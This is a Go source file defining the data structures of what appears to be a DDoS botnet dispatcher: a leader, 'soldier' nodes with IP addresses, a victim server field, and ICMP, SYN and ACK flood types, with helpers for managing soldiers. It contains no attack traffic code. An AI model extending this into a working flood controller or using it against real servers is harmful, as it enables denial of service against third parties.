package dispatcher

type Leader struct {
	Name               string `json:"name"`
	AuthenticationHash string `json:"-"`
}

type Soldier struct {
	Name string `json:"name"`
	Ip   string `json:"ip"`
}

const (
	StatusAttacking = "attacking"
	StatusStopped   = "stopped"
)
const (
	DDOSTypeICMP = "icmp"
	DDOSTypeSYN  = "syn"
	DDOSTypeACK  = "ack"
)

type CampSettings struct {
	Status       string `json:"status"`
	VictimServer string `json:"victim"`
	DDOSType     string `json:"ddos_type"`
}

type Camp struct {
	Leader   Leader       `json:"leader"`
	Soldiers []Soldier    `json:"soldiers"`
	Settings CampSettings `json:"camp_settings"`
}

func (c *Camp) AddSoldier(s Soldier) {
	c.Soldiers = append(c.Soldiers, s)
}

func (c *Camp) RemoveSoldier(name string) {
	for i, soldier := range c.Soldiers {
		if soldier.Name == name {
			c.Soldiers = append(c.Soldiers[:i], c.Soldiers[i+1:]...)
		}
	}
}
func (c *Camp) GetSoldierByName(name string) Soldier {
	for _, soldier := range c.Soldiers {
		if soldier.Name == name {
			return soldier
		}
	}
	return Soldier{}
}

func (c *Camp) GetSoldierByIp(ip string) Soldier {
	for _, soldier := range c.Soldiers {
		if soldier.Ip == ip {
			return soldier
		}
	}
	return Soldier{}
}
func (c *Camp) SoldierExists(name string) bool {
	for _, soldier := range c.Soldiers {
		if soldier.Name == name {
			return true
		}
	}
	return false
}